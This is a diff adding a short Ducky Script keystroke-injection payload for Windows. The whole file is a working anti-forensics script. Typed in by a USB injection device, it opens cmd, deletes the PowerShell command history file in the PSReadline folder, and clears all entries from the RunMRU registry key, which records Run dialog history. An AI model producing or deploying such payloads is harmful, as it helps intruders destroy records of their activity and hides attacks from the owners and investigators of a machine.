@@ -1,0 +1,30 @@
+DELAY 750
+GUI r
+DELAY 800
+STRING cmd
+ENTER
+DELAY 800
+STRING cd  %appdata%\Microsoft\Windows\PowerShell\PSReadline
+DELAY 400
+ENTER 
+DELAY 400
+STRING del ConsoleHost_History.txt
+DELAY 300
+ENTER
+STRING powershell
+ENTER
+DELAY 200
+STRING cmd
+ENTER
+DELAY 200
+ALT F4
+DELAY 800
+GUI r
+
+DELAY 400
+STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+
+ENTER
+DELAY 400
+STRING exit
+ENTER
